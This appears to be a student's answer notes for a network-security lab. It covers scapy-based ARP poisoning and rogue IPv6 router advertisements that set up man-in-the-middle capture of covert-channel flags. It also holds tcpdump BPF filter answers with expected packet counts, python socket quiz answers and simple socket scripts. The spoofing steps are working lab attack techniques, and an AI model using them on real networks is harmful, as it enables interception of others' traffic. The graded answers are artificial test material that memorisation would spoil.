
Data is being sent to T3 from an unknown source over an ICMP covert channel. Use scapy to perform a MitM using ARP to capture this data.
On T2 edit the /proc/sys/net/ipv4/ip_forward file to enable IP Forwarding. Change the value from 0 to 1.
On T2 open scapy as root.
Create the Ethernet Header (Ether) and change the ether-type to the hex value for ARP.
Create the ARP header (ARP) to Poison T4
Create the ARP header (ARP) to Poison T3
Send your crafted headers using sendp.
Intercept the flag being sent over the network.
Use TCPDUMP or Wireshark to capture the FLAG using icmp and host 172.16.82.115 capture filters to minimize the traffic.
The mission prompt will provide the target details.

a=Ether()
>>> a.show()
a.type=0x0806

b=ARP()
>>> b.hwsrc="fa:16:3e:00:50:b1"
>>> b.show()
###[ ARP ]### 
  hwtype    = 0x1
  ptype     = IPv4
  hwlen     = None
  plen      = None
  op        = who-has
  hwsrc     = fa:16:3e:xx:50:xx
  psrc      = 172.16.xx.xxx
  hwdst     = 00:00:00:00:00:00
  pdst      = 0.0.0.0
  
   b.psrc="172.16.82.126"
   b.op="is-at"

sendp (a/b, iface="eth0")

--------------------------------------------------------------------------------------------------------------------------------------------------------
Provide proof of the functional ICMPv6 Router Advertisement to Mission Command.
Data is being sent from T3 to an unknown target using an ICMPv6 covert channel. Use scapy to perform a SLAAC MitM using ICMPv6 to capture this data.
On T2 open scapy as root.
Create the IPv6 header (IPv6) using the All Nodes multicast address.
Create the ICMPv6 Router Advertisement Header (ICMPv6ND_RA).
Create the Source Link-Local Address Option Header (ICMPv6NDOptSrcLLAddr) using your MAC as the source.
Create the ICMPv6 MTU Option Header (ICMPv6NDOptMTU).
Create the ICMPv6 Prefix Information Header (ICMPv6NDOptPrefixInfo) and assign the Prefix (fd00:deaf:cafe::) and Prefix Length of 64.
Send your crafted headers using send.
Intercept the flag being sent over the network.
Use TCPDUMP or Wireshark to capture the FLAG using icmp6 capture filters to minimize the traffic.
The mission prompt will provide the target details.



a=IPv6()
>>> a.show()

b=ICMPv6ND_RA()
>>> b.show()

c=ICMPv6NDOptSrcLLAddr()
>>> c.show()
 c.lladdr="fa:16:3e:00:50:b1"
  
 d=ICMPv6NDOptMTU()
>>> d.show()

e=ICMPv6NDOptPrefixInfo()
>>> e.show()
e.prefix="fd00:deaf:cafe::"
>>> e.show()

send(a/b/c/d/e, iface="eth0")


-------------------------------------------------------------------------------------------------------------------------------------------------------

What is the Berkeley Packet Filter, using tcpdump, to capture all packets with a ttl of 64 and less, utilizing the IPv4 or IPv6 Headers? 
There should be 4880 packets.
Enter the Filter syntax with no spaces

sudo tcpdump "ip[8]<=64 or ip6[7] <=64" -r BPFCheck.pcap | wc -l

-----------------------------------------------------------------------------------------------------------------------------------------------------
What is the Berkeley Packet Filter, using tcpdump, to capture all IPv4 packets with at least the Dont Fragment bit set? There should be 1897 packets.
Enter the Filter syntax with no spaces

sudo tcpdump "ip[6] & 0x40=0x40" -r BPFCheck.pcap | wc -l

-------------------------------------------------------------------------------------------------------------------------------------------------------

What is the Berkeley Packet Filter, using tcpdump, to capture traffic with a Source Port higher than 1024, utilizing the correct Transport Layer Headers? 
There should be 4431 packets.
Enter the Filter syntax with no spaces

sudo tcpdump "tcp[0:2]>1024||udp[0:2]>1024" -r BPFCheck.pcap | wc -l


----------------------------------------------------------------------------------------------------------------------------------------------------------
What is the Berkeley Packet Filter, using tcpdump, to capture all Packets with UDP protocol being set, utilizing the IPv4 or IPv6 Headers? 
There should be 613 packets.
Enter the Filter syntax with no spaces
sudo tcpdump "ip[9]=0x11||ip6[6]=0x11" -r BPFCheck.pcap  |wc -l

-------------------------------------------------------------------------------------------------------------------------------------------

What is the Berkeley Packet Filter, using tcpdump, to capture only packets with the ACK/RST or ACK/FIN flag set, utilizing the correct Transport 
Layer Header? There should be 1161 packets.
Enter the Filter syntax with no spaces

sudo tcpdump "tcp[13]=20||tcp[13]=17" -r BPFCheck.pcap  |wc -l

--------------------------------------------------------------------------------------------------------------------------------------------------
What is the Berkeley Packet Filter, using tcpdump, to capture all packets with an IP ID field of 213? There should be 5 packets.
Enter the Filter syntax with no spaces

sudo tcpdump "ip[4:2]=213" -r BPFCheck.pcap  |wc -l

-----------------------------------------------------------------------------------------------------------------------------------------------------
What is the Berkeley Packet Filter, using tcpdump, to capture all traffic that contains a VLAN tag? There should be 150 packets.
Enter the Filter syntax with no spaces

sudo tcpdump "ether[12:2]=0x8100" -r BPFCheck.pcap  |wc -l
--------------------------------------------------------------------------------------------------------------------------------------------------
What is the Berkeley Packet Filter, using tcpdump, to capture all IPv4 packets relating to DNS? There should be 31 packets.
Enter the Filter syntax with no spaces

sudo tcpdump "tcp[0:2]=53||udp[0:2]=53||tcp[2:2]=53||udp[2:2]=53" -r BPFCheck.pcap  |wc -l

----------------------------------------------------------------------------------------------------------------------------------------------------

What is the Berkeley Packet Filter, using tcpdump, to capture all IPv4 packets with the DSCP field of 24? There should be 31 packets.
Enter the Filter syntax with no spaces

sudo tcpdump "ip[1]>> 2 = 24 " -r BPFCheck.pcap  |wc -l


---------------------------------------------------------------------------------------------------------------------------------------------------------
What is the Berkeley Packet Filter, using tcpdump, to capture all IPv4 packets targeting just the beginning of potential traceroutes as it's 
entering your network. This can be from a Windows or Linux machine using their default settings? There should be 55 packets.
Enter the Filter syntax with no spaces

sudo tcpdump "(ip[9]=0x01||ip[9]=0x11)&&ip[8]=0x01" -r BPFCheck.pcap  |wc -l

--------------------------------------------------------------------------------------------------------------------------------------------------------
What are the 3 Address Families associated with the python3 socket module?
example:
socket.ADDFAM, socket.ADDFAM, socket.ADDFAM


socket.AF_INET,socket.AF_INET6,socket.AF_UNIX


-------------------------------------------------------------------------------------------------------------------------------------
What are the two socket functions called to open a connection and to disconnect from that connection?

example:

socket.fun(), socket.func()


socket.connect(),socket.close()

---------------------------------------------------------------------------------------------------------------------------------------------
What python3 library function is utilized to combine the various pieces of your raw socket packet into network order?
example:
module.function

struct.pack

---------------------------------------------------------------------------------------------------------------------------------------------------
What must be manually created with raw sockets that stream and datagram sockets creates for you?
 header
 
 ---------------------------------------------------------------------------------------------------------------------------------------------------
 
 What function within the socket module allows you to Send data to a socket, while not already being connected to a remote socket?
example:
socket.func()

socket.sendto()

-----------------------------------------------------------------------------------------------------------------------------------------------------

Provide an example of the two required items needed to be set in order to send a Datagram or Stream socket? (excluding any of the socket.socket functions)
example:
item1 item2

ip port

---------------------------------------------------------------------------------------------------------------------------------------------------------
When sending data across a connection, what must a string be converted to before being sent due to encoding?
byte-like object

--------------------------------------------------------------------------------------------------------------------------------------------------------
Gorgan Forces have requested you get a message to one of their remote teams that are utilizing the BLUE_DMZ_HOST-1. 
Utilizing the criteria they provided, generate a stream socket with python3:
Coded information was placed into the video below. Look at the note the woman passes to the man.
https://youtu.be/6WTdTwcmxyo?t=35
From your INTERNET-HOST to the BLUE_DMZ_HOST-1
Port number = #Last four digits on the note
Message = #Name on the note (First letter capitalized)




#/usr/bin/env python3
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#this can also be accomplished by using s= socket.socket(), because AF_inet and SOCK_STREAM are defailts

ipaddr = '172.16.1.15'
port = 5309

s.connect((ipaddr, port))

# to send  a string as a byte like object, add the prefix b to the string. \nis u sed to go to the next line 
s.send(b'Jenny')

# it is recommended that th ebufersize used with recvform is a power of 2 and not a very large numbers of bit
response, conn = s.recvfrom(1024)

#in order to receive a message that is sent as byte-like-object, you mist decond into utf-8 (default)
print(response.decode())

s.close()

---------------------------------------------------------------------------------------------------------------------------------------------------------
Level II Challenge
Gorgan Forces have requested you get a message to one of their remote teams that are utilizing the INTERNET_HOST. 
Utilizing the criteria they provided, generate a datagram socket with python3:
Coded information was placed into the video below. Listen to the words in the video.
https://youtu.be/OuK4OcMUGcg?t=67
Send to your INTERNET-HOST localhost.
Port number = #The number of fists
Message = #The name of the band (First letter capitalized)


#!/usr/bin/env python3

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

ipaddr = '127.0.0.1'
port = 10000

# To send a string as a bytes-like object, add the prefix b to the string. \n is used to go to the next line
s.sendto(b'Disturbed', (ipaddr,port))

# It is recommended that the buffersize used with the recvfrom is a power of 2 and not a very large number in bits.
response, conn = s.recvfrom(1024)

# In order to receive the message that is sent as a btyes-like object you must decode into utf-8(default)
print(response.decode())
--------------------------------------------------------------------------------------------------------------------------------------------------------


